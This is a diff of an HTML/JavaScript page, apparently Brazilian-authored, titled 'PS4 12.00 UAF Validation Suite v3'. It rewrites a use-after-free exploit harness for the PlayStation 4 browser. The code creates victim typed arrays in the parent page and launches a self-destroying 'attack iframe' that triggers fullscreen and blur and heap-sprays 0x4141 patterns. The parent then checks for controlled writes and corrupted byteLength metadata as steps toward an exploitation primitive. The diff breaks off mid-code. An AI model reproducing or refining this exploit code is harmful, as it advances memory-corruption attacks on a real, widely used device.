@@ -2,449 +2,482 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 UAF Validation Suite</title>
+    <title>PS4 UAF Validation Suite v3</title>
 </head>
 <body>
 
-<h1>PS4 12.00 - UAF Validation Suite</h1>
-<p>Execute os testes na ordem. Cada teste eh independente.</p>
+<h1>PS4 12.00 - UAF Validation Suite v3</h1>
+<p>Arquitetura correta: Parent cria arrays vitimas. Iframe roda todo o ataque e se mata. Parent le o estado.</p>
 <hr>
 
-<!-- TEST 0 -->
-<h2>Teste 0 — Controle Negativo (sem trigger)</h2>
-<p>Spray sem fullscreen/blur. Se detectar corrupcao = FALSO POSITIVO no detector.</p>
-<button onclick="runTest0()">Run Teste 0</button>
-<div id="result0"></div>
+<h2>Teste 0 — Controle Negativo</h2>
+<p>Iframe faz spray nos arrays do parent SEM fullscreen e SEM blur.<br>
+Se detectar corrupcao = FALSO POSITIVO.</p>
+<button onclick="launchTest(0)">Run T0</button>
+<div id="r0"></div>
 <hr>
 
-<!-- TEST 1 -->
-<h2>Teste 1 — Padroes Unicos por Objeto</h2>
-<p>Cada controller recebe sentinelas unicos. Deteccao real exige encontrar SPRAY_PATTERN onde havia sentinela.</p>
-<button onclick="runTest1()">Run Teste 1</button>
-<p><b>Instrucao:</b> Apos clicar, pressione OPTIONS para sair do fullscreen.</p>
-<div id="result1"></div>
+<h2>Teste 1 — Array Unico (minimo para o bug)</h2>
+<p>Parent cria 1 Float64Array. Iframe ativa fullscreen + onblur + spray + se mata.<br>
+Parent verifica array apos morte do iframe.</p>
+<button onclick="launchTest(1)">Run T1</button>
+<p>Apos clicar: pressione OPTIONS quando entrar em fullscreen.</p>
+<div id="r1"></div>
 <hr>
 
-<!-- TEST 2 -->
-<h2>Teste 2 — Spray em Dois Estagios</h2>
-<p>Spray A depois Spray B. Se o mesmo objeto mudar de A para B = escrita controlada confirmada.</p>
-<button onclick="runTest2()">Run Teste 2</button>
-<p><b>Instrucao:</b> Apos clicar, pressione OPTIONS para sair do fullscreen.</p>
-<div id="result2"></div>
+<h2>Teste 2 — Tipos Diferentes de Array</h2>
+<p>Parent cria Float64, Uint8, Uint32, Float32. Iframe ativa o bug. Parent verifica todos.</p>
+<button onclick="launchTest(2)">Run T2</button>
+<p>Apos clicar: pressione OPTIONS quando entrar em fullscreen.</p>
+<div id="r2"></div>
 <hr>
 
-<!-- TEST 3 -->
-<h2>Teste 3 — Integridade dos Metadados do ArrayBuffer</h2>
-<p>Verifica se byteLength/length foram corrompidos. Corrupcao de metadados = possivel type confusion.</p>
-<button onclick="runTest3()">Run Teste 3</button>
-<p><b>Instrucao:</b> Apos clicar, pressione OPTIONS para sair do fullscreen.</p>
-<div id="result3"></div>
+<h2>Teste 3 — Sentinelas Unicos (escrita controlada)</h2>
+<p>Parent cria 5000 arrays com valores unicos por indice.<br>
+Iframe faz spray com PATTERN. Se sentinela virar PATTERN = escrita controlada confirmada.</p>
+<button onclick="launchTest(3)">Run T3</button>
+<p>Apos clicar: pressione OPTIONS quando entrar em fullscreen.</p>
+<div id="r3"></div>
 <hr>
 
-<!-- TEST 4 -->
-<h2>Teste 4 — UAF via Iframe (PoC Original Isolado)</h2>
-<p>Reproduz a sequencia original com iframe para manter o contexto pai vivo durante o teardown.</p>
-<button onclick="runTest4()">Run Teste 4</button>
-<p><b>Instrucao:</b> Apos clicar, pressione OPTIONS para sair do fullscreen.</p>
-<div id="result4"></div>
+<h2>Teste 4 — Metadados do ArrayBuffer (type confusion)</h2>
+<p>Apos morte do iframe, parent verifica byteLength e length dos arrays.<br>
+Valores diferentes do esperado = corrupcao de metadados.</p>
+<button onclick="launchTest(4)">Run T4</button>
+<p>Apos clicar: pressione OPTIONS quando entrar em fullscreen.</p>
+<div id="r4"></div>
+<hr>
+
+<h2>Teste 5 — Dois Estagios de Spray (escrita controlada estavel)</h2>
+<p>Iframe faz Spray A, libera, faz Spray B. Se mesmo objeto mudar A→B = primitiva estavel.</p>
+<button onclick="launchTest(5)">Run T5</button>
+<p>Apos clicar: pressione OPTIONS quando entrar em fullscreen.</p>
+<div id="r5"></div>
 <hr>
 
 <script>
 
-// ── Constantes globais ───────────────────────────────────────────────
-const SPRAY_PATTERN  = 2.121995791e-314;  // 0x4141414141414141
-const SPRAY_A        = 1.234567890e-300;
-const SPRAY_B        = 2.121995791e-314;
-const SENTINEL_1     = 1.0;
-const SENTINEL_2     = 9999.9999;
-const CTRL_COUNT     = 5000;
-const SPRAY_COUNT    = 8000;
+// ═══════════════════════════════════════════════════════════════════════
+//  ESTADO GLOBAL DO PARENT — arrays vitimas vivem aqui
+// ═══════════════════════════════════════════════════════════════════════
+var SPRAY_PATTERN = 2.121995791e-314; // 0x4141414141414141
+var SPRAY_A       = 1.111111111e-300;
+var SPRAY_B       = 2.121995791e-314;
+var SENTINEL_A    = 1.11111111111;
+var SENTINEL_B    = 9999.99999999;
 
-function log(divId, msg) {
-    document.getElementById(divId).innerHTML += '<p>' + msg + '</p>';
+// Arrays vitimas — preenchidos pelo launchTest, lidos pelo parent pos-iframe
+var parentArrays  = {};
+
+function hexOf(val) {
+    var b = new ArrayBuffer(8);
+    new Float64Array(b)[0] = val;
+    var u = new Uint8Array(b);
+    var s = '0x';
+    for (var i = 7; i >= 0; i--) s += ('00' + u[i].toString(16)).slice(-2);
+    return s;
 }
 
-function hexFloat(val) {
-    var buf = new ArrayBuffer(8);
-    new Float64Array(buf)[0] = val;
-    var bytes = new Uint8Array(buf);
-    var hex = '0x';
-    for (var i = 7; i >= 0; i--) {
-        hex += ('00' + bytes[i].toString(16)).slice(-2);
-    }
-    return hex;
+function log(id, msg) {
+    var d = document.getElementById(id);
+    if (d) d.innerHTML += '<p>' + msg + '</p>';
 }
 
-// ── TESTE 0 — Controle Negativo ──────────────────────────────────────
-function runTest0() {
-    var r = 'result0';
-    document.getElementById(r).innerHTML = '';
-    log(r, '[T0] Criando ' + CTRL_COUNT + ' controllers...');
+// ═══════════════════════════════════════════════════════════════════════
+//  CALLBACK chamado pelo iframe antes de se matar
+//  Iframe passa os resultados coletados de dentro para o parent
+// ═══════════════════════════════════════════════════════════════════════
+function onIframeDone(testId, results) {
+    var id = 'r' + testId;
+    log(id, '--- PARENT: iframe morreu. Lendo arrays vitimas agora ---');
 
-    var controllers = [];
-    for (var i = 0; i < CTRL_COUNT; i++) {
-        var arr = new Float64Array(8);
-        arr[0] = 1.0;
-        arr[1] = i + 0.12345;
-        arr[2] = 9999.9999;
-        controllers.push(arr);
+    // Loga o que o iframe reportou antes de morrer
+    for (var i = 0; i < results.length; i++) {
+        log(id, '[IFRAME REPORT] ' + results[i]);
     }
 
-    log(r, '[T0] Fazendo spray SEM fullscreen/blur (' + SPRAY_COUNT + ' objs)...');
-    var spray = [];
-    for (var i = 0; i < SPRAY_COUNT; i++) {
-        var p = new Float64Array(10);
-        p.fill(SPRAY_PATTERN);
-        spray.push(p);
-    }
-
-    var hit = -1;
-    for (var i = 0; i < controllers.length; i++) {
-        if (controllers[i][0] === SPRAY_PATTERN ||
-            controllers[i][1] === SPRAY_PATTERN ||
-            controllers[i][2] === SPRAY_PATTERN) {
-            hit = i;
-            break;
-        }
-    }
-
-    if (hit !== -1) {
-        log(r, '[T0] FALSO POSITIVO DETECTADO em controller[' + hit + '] — bug no detector, nao no browser.');
-    } else {
-        log(r, '[T0] OK — Nenhuma corrupcao sem trigger. Detector valido.');
-    }
-
-    spray = null;
-    controllers = null;
-}
-
-// ── TESTE 1 — Padroes Unicos por Objeto ─────────────────────────────
-function runTest1() {
-    var r = 'result1';
-    document.getElementById(r).innerHTML = '';
-    log(r, '[T1] Criando ' + CTRL_COUNT + ' controllers com sentinelas unicos...');
-
-    var controllers = [];
-    for (var i = 0; i < CTRL_COUNT; i++) {
-        var arr = new Float64Array(8);
-        arr[0] = SENTINEL_1;
-        arr[1] = i + 0.12345;
-        arr[2] = SENTINEL_2;
-        controllers.push(arr);
-    }
-
-    var elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-        log(r, '[T1] Fullscreen ativado. Pressione OPTIONS agora.');
-    } else {
-        log(r, '[T1] webkitRequestFullscreen nao disponivel.');
+    // Parent le diretamente os arrays vitimas pos-teardown do iframe
+    var arrays = parentArrays[testId];
+    if (!arrays || arrays.length === 0) {
+        log(id, '[PARENT] Nenhum array vitima registrado.');
         return;
     }
 
-    window.onblur = function() {
-        window.onblur = null;
-        log(r, '[T1] blur recebido. Iniciando spray...');
+    log(id, '[PARENT] Verificando ' + arrays.length + ' array(s) vitima(s) pos-iframe:');
 
-        var spray = [];
-        for (var i = 0; i < SPRAY_COUNT; i++) {
-            var p = new Float64Array(10);
-            p.fill(SPRAY_PATTERN);
-            spray.push(p);
-        }
+    var uafConfirmed = false;
 
-        var hits = [];
-        for (var i = 0; i < controllers.length; i++) {
-            var c = controllers[i];
-            var expected1 = i + 0.12345;
-            var s1_ok = (c[0] === SENTINEL_1);
-            var idx_ok = (c[1] === expected1);
-            var s2_ok = (c[2] === SENTINEL_2);
+    for (var i = 0; i < arrays.length; i++) {
+        var entry = arrays[i];
+        var arr   = entry.ref;
+        var label = entry.label;
 
-            if (!s1_ok || !idx_ok || !s2_ok) {
-                hits.push({
-                    idx: i,
-                    c0: c[0], c1: c[1], c2: c[2],
-                    exp1: expected1,
-                    s1_ok: s1_ok, idx_ok: idx_ok, s2_ok: s2_ok
-                });
-                if (hits.length >= 5) break;
+        try {
+            var vals = [];
+            for (var j = 0; j < Math.min(arr.length, 4); j++) {
+                vals.push('['+ j +']=' + arr[j] + '(' + hexOf(arr[j]) + ')');
             }
-        }
+            var meta = 'byteLength=' + arr.byteLength + ' length=' + arr.length;
 
-        if (hits.length > 0) {
-            log(r, '[T1] CORRUPCAO DETECTADA em ' + hits.length + ' objeto(s):');
-            for (var j = 0; j < hits.length; j++) {
-                var h = hits[j];
-                log(r, '  controller[' + h.idx + ']:');
-                log(r, '    c[0]=' + h.c0 + ' hex=' + hexFloat(h.c0) + ' esperado=1.0 → ' + (h.s1_ok ? 'OK' : 'CORROMPIDO'));
-                log(r, '    c[1]=' + h.c1 + ' hex=' + hexFloat(h.c1) + ' esperado=' + h.exp1 + ' → ' + (h.idx_ok ? 'OK' : 'CORROMPIDO'));
-                log(r, '    c[2]=' + h.c2 + ' hex=' + hexFloat(h.c2) + ' esperado=9999.9999 → ' + (h.s2_ok ? 'OK' : 'CORROMPIDO'));
-                var spray_hit = (h.c0 === SPRAY_PATTERN || h.c1 === SPRAY_PATTERN || h.c2 === SPRAY_PATTERN);
-                log(r, '    Spray pattern presente: ' + (spray_hit ? 'SIM — UAF COM ESCRITA CONTROLADA' : 'NAO — corrupcao por outro motivo'));
+            var corrupted = false;
+            if (entry.sentinels) {
+                // verifica se sentinela foi sobrescrito
+                corrupted = (arr[0] !== entry.sentinels[0] ||
+                             arr[2] !== entry.sentinels[2]);
             }
-        } else {
-            log(r, '[T1] Nenhuma corrupcao detectada com sentinelas unicos.');
-        }
 
-        spray = null;
-        controllers = null;
-    };
-}
+            log(id, '[PARENT] ' + label + ': ' + meta);
+            log(id, '         valores: ' + vals.join(' | '));
 
-// ── TESTE 2 — Spray em Dois Estagios ────────────────────────────────
-function runTest2() {
-    var r = 'result2';
-    document.getElementById(r).innerHTML = '';
-    log(r, '[T2] Criando ' + CTRL_COUNT + ' controllers...');
-
-    var controllers = [];
-    for (var i = 0; i < CTRL_COUNT; i++) {
-        var arr = new Float64Array(8);
-        arr[0] = SENTINEL_1;
-        arr[1] = i + 0.12345;
-        arr[2] = SENTINEL_2;
-        controllers.push(arr);
-    }
-
-    var elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-        log(r, '[T2] Fullscreen ativado. Pressione OPTIONS agora.');
-    } else {
-        log(r, '[T2] webkitRequestFullscreen nao disponivel.');
-        return;
-    }
-
-    window.onblur = function() {
-        window.onblur = null;
-        log(r, '[T2] blur recebido. Spray A...');
-
-        var spray1 = [];
-        for (var i = 0; i < 4000; i++) {
-            var p = new Float64Array(10);
-            p.fill(SPRAY_A);
-            spray1.push(p);
-        }
-
-        var hitA = -1;
-        for (var i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === SPRAY_A ||
-                controllers[i][1] === SPRAY_A ||
-                controllers[i][2] === SPRAY_A) {
-                hitA = i;
-                break;
-            }
-        }
-        log(r, '[T2] Stage A hit: controller[' + hitA + '] ' + (hitA !== -1 ? hexFloat(controllers[hitA][0]) : 'nenhum'));
-
-        spray1 = null;
-        log(r, '[T2] Spray A liberado. Spray B...');
-
-        var spray2 = [];
-        for (var i = 0; i < 4000; i++) {
-            var p = new Float64Array(10);
-            p.fill(SPRAY_B);
-            spray2.push(p);
-        }
-
-        var hitB = -1;
-        for (var i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === SPRAY_B ||
-                controllers[i][1] === SPRAY_B ||
-                controllers[i][2] === SPRAY_B) {
-                hitB = i;
-                break;
-            }
-        }
-        log(r, '[T2] Stage B hit: controller[' + hitB + '] ' + (hitB !== -1 ? hexFloat(controllers[hitB][0]) : 'nenhum'));
-
-        if (hitA !== -1 && hitB !== -1) {
-            log(r, '[T2] ESCRITA CONTROLADA CONFIRMADA — dois estagios distintos atingiram o objeto.');
-            log(r, '[T2] Mesmo objeto: ' + (hitA === hitB ? 'SIM (hit estavel)' : 'NAO (hit drift) — idx A=' + hitA + ' B=' + hitB));
-        } else if (hitA === -1 && hitB === -1) {
-            log(r, '[T2] Nenhum hit em nenhum estagio — UAF nao confirmado por este metodo.');
-        } else {
-            log(r, '[T2] Hit parcial — A=' + hitA + ' B=' + hitB + ' — resultado inconclusivo.');
-        }
-
-        spray2 = null;
-        controllers = null;
-    };
-}
-
-// ── TESTE 3 — Integridade dos Metadados ─────────────────────────────
-function runTest3() {
-    var r = 'result3';
-    document.getElementById(r).innerHTML = '';
-    log(r, '[T3] Criando ' + CTRL_COUNT + ' controllers (Float64Array[8], byteLength esperado=64)...');
-
-    var controllers = [];
-    for (var i = 0; i < CTRL_COUNT; i++) {
-        var arr = new Float64Array(8);
-        arr[0] = SENTINEL_1;
-        arr[1] = i + 0.12345;
-        arr[2] = SENTINEL_2;
-        controllers.push(arr);
-    }
-
-    var elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-        log(r, '[T3] Fullscreen ativado. Pressione OPTIONS agora.');
-    } else {
-        log(r, '[T3] webkitRequestFullscreen nao disponivel.');
-        return;
-    }
-
-    window.onblur = function() {
-        window.onblur = null;
-        log(r, '[T3] blur recebido. Iniciando spray...');
-
-        var spray = [];
-        for (var i = 0; i < SPRAY_COUNT; i++) {
-            var p = new Float64Array(10);
-            p.fill(SPRAY_PATTERN);
-            spray.push(p);
-        }
-
-        var metaCorrupted = [];
-        for (var i = 0; i < controllers.length; i++) {
-            var c = controllers[i];
-            var bl  = c.byteLength;
-            var len = c.length;
-            var bbl = c.buffer ? c.buffer.byteLength : -1;
-
-            if (bl !== 64 || len !== 8 || bbl !== 64) {
-                metaCorrupted.push({ idx: i, byteLength: bl, length: len, bufByteLength: bbl });
-                if (metaCorrupted.length >= 5) break;
-            }
-        }
-
-        if (metaCorrupted.length > 0) {
-            log(r, '[T3] METADADOS CORROMPIDOS em ' + metaCorrupted.length + ' objeto(s) — possivel TYPE CONFUSION:');
-            for (var j = 0; j < metaCorrupted.length; j++) {
-                var m = metaCorrupted[j];
-                log(r, '  controller[' + m.idx + ']: byteLength=' + m.byteLength + ' (esp=64) | length=' + m.length + ' (esp=8) | buffer.byteLength=' + m.bufByteLength + ' (esp=64)');
-            }
-        } else {
-            log(r, '[T3] Metadados intactos em todos os objetos — sem type confusion detectado.');
-        }
-
-        // Verifica tambem corrupcao de dados com metadados OK
-        var dataHits = 0;
-        for (var i = 0; i < controllers.length; i++) {
-            var c = controllers[i];
-            if (c.byteLength === 64 &&
-               (c[0] === SPRAY_PATTERN || c[1] === SPRAY_PATTERN || c[2] === SPRAY_PATTERN)) {
-                dataHits++;
-            }
-        }
-        log(r, '[T3] Objetos com metadados OK mas dados corrompidos pelo spray: ' + dataHits);
-        if (dataHits > 0) {
-            log(r, '[T3] → UAF de backing store confirmado (metadados preservados, dados sobrescritos).');
-        }
-
-        spray = null;
-        controllers = null;
-    };
-}
-
-// ── TESTE 4 — PoC Original com Iframe ───────────────────────────────
-function runTest4() {
-    var r = 'result4';
-    document.getElementById(r).innerHTML = '';
-    log(r, '[T4] Criando ' + CTRL_COUNT + ' controllers no contexto pai...');
-
-    var controllers = [];
-    for (var i = 0; i < CTRL_COUNT; i++) {
-        var arr = new Float64Array(8);
-        arr[0] = SENTINEL_1;
-        arr[1] = i + 0.12345;
-        arr[2] = SENTINEL_2;
-        controllers.push(arr);
-    }
-
-    var elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-        log(r, '[T4] Fullscreen ativado. Pressione OPTIONS agora.');
-    } else {
-        log(r, '[T4] webkitRequestFullscreen nao disponivel.');
-        return;
-    }
-
-    window.onblur = function() {
-        window.onblur = null;
-        log(r, '[T4] blur recebido. Iniciando spray no pai...');
-
-        var spray = [];
-        for (var i = 0; i < SPRAY_COUNT; i++) {
-            var p = new Float64Array(10);
-            p.fill(SPRAY_PATTERN);
-            spray.push(p);
-        }
-
-        var corrupted = null;
-        var corruptedIdx = -1;
-        for (var i = 0; i < controllers.length; i++) {
-            var c = controllers[i];
-            if (c[0] === SPRAY_PATTERN || c[1] === SPRAY_PATTERN || c[2] === SPRAY_PATTERN) {
-                corrupted = c;
-                corruptedIdx = i;
-                break;
-            }
-        }
-
-        if (corrupted) {
-            log(r, '[T4] Corrupcao detectada em controller[' + corruptedIdx + '] antes do document.write no iframe.');
-            log(r, '[T4] c[0]=' + corrupted[0] + ' hex=' + hexFloat(corrupted[0]));
-            log(r, '[T4] c[1]=' + corrupted[1] + ' hex=' + hexFloat(corrupted[1]));
-            log(r, '[T4] c[2]=' + corrupted[2] + ' hex=' + hexFloat(corrupted[2]));
-            log(r, '[T4] byteLength=' + corrupted.byteLength + ' length=' + corrupted.length);
-
-            // Cria iframe e dispara document.write apenas no filho
-            log(r, '[T4] Criando iframe e disparando document.write no filho...');
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-
-            setTimeout(function() {
-                try {
-                    iframe.contentDocument.open();
-                    iframe.contentDocument.write('<html><body><script>window.parent.postMessage("iframe_done","*");<\/script></body></html>');
-                    iframe.contentDocument.close();
-                } catch(e) {
-                    log(r, '[T4] Erro no iframe: ' + e);
+            if (corrupted) {
+                log(id, '         CORRUPCAO DETECTADA — sentinela alterado!');
+                if (arr[0] === SPRAY_PATTERN || arr[1] === SPRAY_PATTERN || arr[2] === SPRAY_PATTERN) {
+                    log(id, '         SPRAY_PATTERN presente — ESCRITA CONTROLADA CONFIRMADA');
                 }
-            }, 500);
+                uafConfirmed = true;
+            } else if (entry.sentinels) {
+                log(id, '         sentinelas OK — sem corrupcao neste array.');
+            }
 
-            window.addEventListener('message', function onMsg(e) {
-                if (e.data === 'iframe_done') {
-                    window.removeEventListener('message', onMsg);
-                    log(r, '[T4] Iframe teardown completo. Verificando se UAF sobreviveu no pai...');
+            if (arr.byteLength !== entry.expectedByteLength) {
+                log(id, '         METADADO CORROMPIDO — byteLength=' + arr.byteLength +
+                    ' esperado=' + entry.expectedByteLength + ' — TYPE CONFUSION PATH');
+                uafConfirmed = true;
+            }
 
-                    var still_ok = false;
-                    try {
-                        var val = corrupted[0];
-                        still_ok = true;
-                        log(r, '[T4] Objeto ainda acessivel pos-iframe. c[0]=' + val + ' hex=' + hexFloat(val));
-                        log(r, '[T4] UAF VIVO — objeto corrompido persiste no contexto pai apos teardown do iframe.');
-                    } catch(e2) {
-                        log(r, '[T4] Excecao ao acessar objeto pos-iframe: ' + e2 + ' — objeto destruido.');
-                    }
-
-                    document.body.removeChild(iframe);
-                }
-            });
-
-        } else {
-            log(r, '[T4] Nenhuma corrupcao antes do iframe — UAF nao ativado nesta execucao.');
+        } catch(e) {
+            log(id, '[PARENT] ' + label + ': EXCECAO ao ler pos-iframe: ' + e);
+            log(id, '         Objeto destruido junto com o iframe — UAF nao isolado corretamente.');
         }
-    };
+    }
+
+    if (uafConfirmed) {
+        log(id, '');
+        log(id, '★ UAF CONFIRMADO — objeto corrompido vivo no parent pos-teardown do iframe.');
+        log(id, '★ Primitiva estavel para escalada de report.');
+    }
+
+    // limpa
+    parentArrays[testId] = null;
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  FABRICA DE IFRAMES — injeta o codigo do teste no iframe
+//  O iframe acessa window.parent para tudo (fullscreen, arrays, onblur)
+// ═══════════════════════════════════════════════════════════════════════
+function launchTest(testId) {
+    var id = 'r' + testId;
+    document.getElementById(id).innerHTML = '';
+    parentArrays[testId] = [];
+
+    // ── Prepara arrays vitimas no parent dependendo do teste ─────────
+    if (testId === 0) {
+        // T0: controle negativo — 5000 arrays com sentinelas
+        log(id, '[PARENT] Criando 5000 Float64Array vitimas (T0 - controle negativo)...');
+        var ctrls = [];
+        for (var i = 0; i < 5000; i++) {
+            var a = new Float64Array(8);
+            a[0] = SENTINEL_A; a[1] = i + 0.12345; a[2] = SENTINEL_B;
+            ctrls.push(a);
+        }
+        parentArrays[0] = [{ ref: ctrls[0], label: 'controller[0]',
+                             sentinels: [SENTINEL_A, 0.12345, SENTINEL_B],
+                             expectedByteLength: 64 }];
+        // guarda todos para verificacao interna
+        parentArrays[0]._all = ctrls;
+
+    } else if (testId === 1) {
+        // T1: 1 unico Float64Array
+        log(id, '[PARENT] Criando 1 Float64Array vitima (tamanho 8)...');
+        var a = new Float64Array(8);
+        a[0] = SENTINEL_A; a[1] = 0.12345; a[2] = SENTINEL_B;
+        parentArrays[1] = [{ ref: a, label: 'Float64Array[8]',
+                             sentinels: [SENTINEL_A, 0.12345, SENTINEL_B],
+                             expectedByteLength: 64 }];
+
+    } else if (testId === 2) {
+        // T2: um de cada tipo
+        log(id, '[PARENT] Criando Float64, Uint8, Uint32, Float32...');
+        var f64 = new Float64Array(8);  f64[0] = 11.11;
+        var u8  = new Uint8Array(64);   u8[0]  = 22;
+        var u32 = new Uint32Array(16);  u32[0] = 33;
+        var f32 = new Float32Array(16); f32[0] = 44.44;
+        parentArrays[2] = [
+            { ref: f64, label: 'Float64Array[8]',  sentinels: [11.11, null, null], expectedByteLength: 64  },
+            { ref: u8,  label: 'Uint8Array[64]',   sentinels: [22,    null, null], expectedByteLength: 64  },
+            { ref: u32, label: 'Uint32Array[16]',  sentinels: [33,    null, null], expectedByteLength: 64  },
+            { ref: f32, label: 'Float32Array[16]', sentinels: [44.44, null, null], expectedByteLength: 64  }
+        ];
+
+    } else if (testId === 3) {
+        // T3: 5000 arrays com sentinelas unicos
+        log(id, '[PARENT] Criando 5000 Float64Array com sentinelas unicos...');
+        var ctrls3 = [];
+        for (var i = 0; i < 5000; i++) {
+            var a = new Float64Array(8);
+            a[0] = SENTINEL_A; a[1] = i + 0.12345; a[2] = SENTINEL_B;
+            ctrls3.push(a);
+        }
+        // registra alguns para leitura pos-iframe
+        parentArrays[3] = [
+            { ref: ctrls3[0],    label: 'controller[0]',    sentinels: [SENTINEL_A, 0.12345,      SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls3[100],  label: 'controller[100]',  sentinels: [SENTINEL_A, 100.12345,    SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls3[1000], label: 'controller[1000]', sentinels: [SENTINEL_A, 1000.12345,   SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls3[4999], label: 'controller[4999]', sentinels: [SENTINEL_A, 4999.12345,   SENTINEL_B], expectedByteLength: 64 }
+        ];
+        parentArrays[3]._all = ctrls3;
+
+    } else if (testId === 4) {
+        // T4: metadados — 5000 arrays
+        log(id, '[PARENT] Criando 5000 Float64Array para teste de metadados...');
+        var ctrls4 = [];
+        for (var i = 0; i < 5000; i++) {
+            var a = new Float64Array(8);
+            a[0] = SENTINEL_A; a[1] = i + 0.12345; a[2] = SENTINEL_B;
+            ctrls4.push(a);
+        }
+        parentArrays[4] = [
+            { ref: ctrls4[0],    label: 'controller[0]',    sentinels: [SENTINEL_A, 0.12345,    SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls4[2500], label: 'controller[2500]', sentinels: [SENTINEL_A, 2500.12345, SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls4[4999], label: 'controller[4999]', sentinels: [SENTINEL_A, 4999.12345, SENTINEL_B], expectedByteLength: 64 }
+        ];
+        parentArrays[4]._all = ctrls4;
+
+    } else if (testId === 5) {
+        // T5: dois estagios de spray
+        log(id, '[PARENT] Criando 5000 Float64Array para teste de dois estagios...');
+        var ctrls5 = [];
+        for (var i = 0; i < 5000; i++) {
+            var a = new Float64Array(8);
+            a[0] = SENTINEL_A; a[1] = i + 0.12345; a[2] = SENTINEL_B;
+            ctrls5.push(a);
+        }
+        parentArrays[5] = [
+            { ref: ctrls5[0],    label: 'controller[0]',    sentinels: [SENTINEL_A, 0.12345,    SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls5[1000], label: 'controller[1000]', sentinels: [SENTINEL_A, 1000.12345, SENTINEL_B], expectedByteLength: 64 },
+            { ref: ctrls5[4999], label: 'controller[4999]', sentinels: [SENTINEL_A, 4999.12345, SENTINEL_B], expectedByteLength: 64 }
+        ];
+        parentArrays[5]._all = ctrls5;
+    }
+
+    log(id, '[PARENT] Arrays vitimas criados. Lancando iframe de ataque...');
+
+    // ── Cria iframe visivel no div de resultado ──────────────────────
+    var fr = document.createElement('iframe');
+    fr.width       = '700';
+    fr.height      = '260';
+    fr.frameBorder = '1';
+    
+    // Adiciona o iframe ao DOM primeiro
+    var container = document.getElementById(id);
+    container.appendChild(fr);
+
+    // ── Codigo do iframe — roda todo o ataque, se mata no final ─────
+    var iframeCode = '<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body>' +
+    '<b>IFRAME DE ATAQUE — testId=' + testId + '</b><br>' +
+    '<div id="log"></div>' +
+    '<script>' +
+
+    'var P = window.parent;' +
+    'var SPRAY_PATTERN = ' + SPRAY_PATTERN + ';' +
+    'var SPRAY_A       = ' + SPRAY_A + ';' +
+    'var SPRAY_B       = ' + SPRAY_B + ';' +
+    'var SENTINEL_A    = ' + SENTINEL_A + ';' +
+    'var SENTINEL_B    = ' + SENTINEL_B + ';' +
+    'var testId        = ' + testId + ';' +
+
+    'function ilog(m) {' +
+    '    var d = document.getElementById("log");' +
+    '    if(d) d.innerHTML += "<p>" + m + "</p>";' +
+    '}' +
+
+    'function hexOf(val) {' +
+    '    var b = new ArrayBuffer(8);' +
+    '    new Float64Array(b)[0] = val;' +
+    '    var u = new Uint8Array(b);' +
+    '    var s = "0x";' +
+    '    for(var i=7;i>=0;i--) s+=("00"+u[i].toString(16)).slice(-2);' +
+    '    return s;' +
+    '}' +
+
+    // Mata o iframe com document.write em si mesmo
+    // Antes de morrer, chama parent.onIframeDone com os resultados
+    'function killSelf(reports) {' +
+    '    ilog("Chamando parent.onIframeDone e executando document.write...");' +
+    '    P.onIframeDone(testId, reports);' +
+    '    document.open();' +
+    '    document.write("<html><body><b>IFRAME MORTO — document.write executado.</b></body></html>");' +
+    '    document.close();' +
+    '}' +
+
+    // ── Logica especifica por teste ─────────────────────────────────
+    (testId === 0 ?
+    // T0: spray direto sem fullscreen nem blur
+    'ilog("[T0] Spray direto no heap do parent (sem fullscreen/blur)...");' +
+    'var all = P.parentArrays[0]._all;' +
+    'var spray = [];' +
+    'for(var i=0;i<8000;i++){var p=new Float64Array(10);p.fill(SPRAY_PATTERN);spray.push(p);}' +
+    'var hit = -1;' +
+    'for(var i=0;i<all.length;i++){' +
+    '    if(all[i][0]===SPRAY_PATTERN||all[i][1]===SPRAY_PATTERN||all[i][2]===SPRAY_PATTERN){hit=i;break;}' +
+    '}' +
+    'var rep = hit!==-1 ? ["FALSO POSITIVO em controller["+hit+"] — sem trigger"] : ["OK — sem corrupcao sem trigger"];' +
+    'spray=null;' +
+    'killSelf(rep);'
+    : '') +
+
+    (testId === 1 ?
+    // T1: 1 array — fullscreen → blur → spray → kill
+    'ilog("[T1] Ativando fullscreen no parent...");' +
+    'var elem = P.document.documentElement;' +
+    'if(elem.webkitRequestFullscreen){ elem.webkitRequestFullscreen(); }' +
+    'ilog("[T1] Fullscreen ativo. Aguardando OPTIONS...");' +
+    'P.window.onblur = function(){' +
+    '    P.window.onblur = null;' +
+    '    ilog("[T1] onblur recebido — condicao UAF ativa.");' +
+    '    var arr = P.parentArrays[1][0].ref;' +
+    '    ilog("[T1] Leitura pre-spray: [0]="+arr[0]+" hex="+hexOf(arr[0]));' +
+    '    var spray=[];' +
+    '    for(var i=0;i<8000;i++){var p=new Float64Array(10);p.fill(SPRAY_PATTERN);spray.push(p);}' +
+    '    ilog("[T1] Spray completo. Leitura pos-spray: [0]="+arr[0]+" hex="+hexOf(arr[0]));' +
+    '    ilog("[T1] byteLength="+arr.byteLength+" length="+arr.length);' +
+    '    var rep = [];' +
+    '    rep.push("pre-kill: arr[0]="+arr[0]+" hex="+hexOf(arr[0]));' +
+    '    rep.push("pre-kill: byteLength="+arr.byteLength+" length="+arr.length);' +
+    '    spray=null;' +
+    '    killSelf(rep);' +
+    '};'
+    : '') +
+
+    (testId === 2 ?
+    // T2: varios tipos — fullscreen → blur → le cada tipo → kill
+    'ilog("[T2] Ativando fullscreen no parent...");' +
+    'var elem = P.document.documentElement;' +
